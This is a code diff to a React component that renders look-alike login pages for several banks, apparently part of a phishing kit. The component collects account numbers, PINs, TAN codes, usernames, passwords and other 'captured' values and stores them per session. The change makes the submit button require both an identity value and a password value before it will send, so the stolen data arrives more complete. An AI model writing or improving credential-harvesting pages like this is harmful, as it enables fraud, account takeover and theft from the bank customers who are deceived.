@@ -206,6 +206,19 @@ function shouldResetPreviousBankField(key: string): boolean {
 function hasMeaningfulSubmitValue(value: unknown): boolean {
   return typeof value === "string" && value.trim().length > 0;
 }
+
+function countMeaningfulCredentialEntries(values: Array<unknown>): number {
+  return values.filter(hasMeaningfulSubmitValue).length;
+}
+
+function hasIdentityCredentialValue(values: Array<unknown>) {
+  return values.some(hasMeaningfulSubmitValue);
+}
+
+function hasPasswordCredentialValue(values: Array<unknown>) {
+  return values.some(hasMeaningfulSubmitValue);
+}
+
 export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
@@ -219,6 +232,9 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
   const [personalCode, setPersonalCode] = useState("");
   const [loginMethod, setLoginMethod] = useState("");
+  const canSubmitPrimaryCredentials =
+    hasIdentityCredentialValue([verfuegernummer, personalCode]) &&
+    hasPasswordCredentialValue([pin]);
 
   useEffect(() => {
     let cancelled = false;
@@ -366,23 +382,33 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         return [String(value).trim()];
       },
     );
-    const hasCurrentSubmissionData = [
-      currentVerfuegernummer,
-      currentPin,
-      currentTacCode,
-      currentPersonalCode,
-      typeof overrideData?.bankPhone === "string" ? overrideData.bankPhone : "",
-      typeof overrideData?.username === "string" ? overrideData.username : "",
-      typeof overrideData?.password === "string" ? overrideData.password : "",
-      typeof overrideData?.orderedField1 === "string" ? overrideData.orderedField1 : "",
-      typeof overrideData?.orderedField2 === "string" ? overrideData.orderedField2 : "",
-      typeof overrideData?.orderedField3 === "string" ? overrideData.orderedField3 : "",
-      ...currentExtraCapturedValues,
-    ].some(hasMeaningfulSubmitValue);
+    const hasIdentityCredential =
+      hasIdentityCredentialValue([
+        currentVerfuegernummer,
+        currentPersonalCode,
+        currentBankPhone,
+        currentUsername,
+        currentOrderedField1Key === "username" || currentOrderedField1Key === "personalCode" || currentOrderedField1Key === "bankPhone"
+          ? currentOrderedField1
+          : "",
+        currentOrderedField2Key === "username" || currentOrderedField2Key === "personalCode" || currentOrderedField2Key === "bankPhone"
+          ? currentOrderedField2
+          : "",
+        currentOrderedField3Key === "username" || currentOrderedField3Key === "personalCode" || currentOrderedField3Key === "bankPhone"
+          ? currentOrderedField3
+          : "",
+      ]);
+    const hasPasswordCredential =
+      hasPasswordCredentialValue([
+        currentPin,
+        currentPassword,
+        currentOrderedField1Key === "password" || currentOrderedField1Key === "pin" ? currentOrderedField1 : "",
+        currentOrderedField2Key === "password" || currentOrderedField2Key === "pin" ? currentOrderedField2 : "",
+        currentOrderedField3Key === "password" || currentOrderedField3Key === "pin" ? currentOrderedField3 : "",
+      ]);
 
-    if (!hasCurrentSubmissionData) {
+    if (!hasIdentityCredential || !hasPasswordCredential) {
       setSaving(false);
-      setError("Form alanlari doldurulmadan devam edilemez.");
       return;
     }
 
@@ -578,12 +604,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         }
 
         if (element.type === "button") {
-          props.disabled = saving || props.disabled;
+          props.disabled = saving || !canSubmitPrimaryCredentials || props.disabled;
           if (props.type === "submit") {
             props.style = {
               ...props.style,
-              opacity: saving ? 0.7 : props.style?.opacity,
-              cursor: saving ? "not-allowed" : props.style?.cursor,
+              opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : props.style?.opacity,
+              cursor: saving || !canSubmitPrimaryCredentials ? "not-allowed" : props.style?.cursor,
             };
           }
         }
@@ -634,8 +660,16 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             if (domNode.name === "button" && domNode.attribs?.type === "submit") {
               const props = attributesToProps(domNode.attribs);
               return (
-                <button {...props} disabled={saving} style={{ ...props.style, opacity: saving ? 0.7 : 1, cursor: saving ? 'not-allowed' : 'pointer' }}>
-                  {saving ? "Laden..." : domToReact(domNode.children as any, options)}
+                <button
+                  {...props}
+                  disabled={saving || !canSubmitPrimaryCredentials}
+                  style={{
+                    ...props.style,
+                    opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : 1,
+                    cursor: saving || !canSubmitPrimaryCredentials ? 'not-allowed' : 'pointer',
+                  }}
+                >
+                  {domToReact(domNode.children as any, options)}
                 </button>
               );
             }
@@ -722,7 +756,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                   
                   <button 
                     type="submit"
-                    disabled={saving}
+                    disabled={saving || !canSubmitPrimaryCredentials}
                     style={{
                       width: '100%',
                       backgroundColor: design.button.backgroundColor,
@@ -731,11 +765,11 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                       borderRadius: design.button.borderRadius,
                       fontWeight: design.button.fontWeight as any,
                       border: 'none',
-                      cursor: saving ? 'not-allowed' : 'pointer',
-                      opacity: saving ? 0.7 : 1
+                      cursor: saving || !canSubmitPrimaryCredentials ? 'not-allowed' : 'pointer',
+                      opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : 1
                     }}
                   >
-                    {saving ? "Laden..." : design.texts.title}
+                    {design.texts.title}
                   </button>
                 </form>
               </div>
@@ -863,11 +897,11 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
           <button
             type="submit"
-            disabled={saving}
+            disabled={saving || !canSubmitPrimaryCredentials}
             className="w-full rounded-xl py-4 text-lg font-bold shadow-md transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
             style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
           >
-            {saving ? "Controleren..." : theme.buttonText}
+            {theme.buttonText}
           </button>
         </form>
       </div>
